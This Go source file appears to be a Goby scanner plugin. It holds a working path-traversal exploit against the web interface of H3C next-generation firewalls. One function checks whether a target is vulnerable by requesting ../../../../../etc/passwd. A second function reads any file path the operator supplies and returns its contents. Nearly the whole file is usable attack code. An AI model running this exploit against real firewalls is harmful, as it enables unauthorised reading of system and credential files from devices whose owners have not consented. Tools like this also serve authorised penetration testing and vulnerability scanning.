package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "H3C Next generation firewall File read",
  "Description": "Attackers can download arbitrary files on the server through the vulnerability",
  "Product": "H3C Next generation firewall",
  "Homepage": "http://www.h3c.com.cn",
  "DisclosureDate": "2021-05-28",
  "Author": "PeiQi",
  "GobyQuery": "app=\"H3C-Firewall\"",
  "Level": "2",
  "Impact": "<p>File read</p>",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "File",
      "type": "input",
      "value": "/etc/passwd"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "File read"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "H3C Next generation firewall"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Recommandation": "<p>undefined</p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/webui/?g=sys_dia_data_down&file_name=../../../../../etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    file := ss.Params["File"].(string)
		    uri := "/webui/?g=sys_dia_data_down&file_name=../../../../.." + file
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
        		expResult.Output = resp.RawBody
        		expResult.Success = true
        	}
			return expResult
		},
	))
}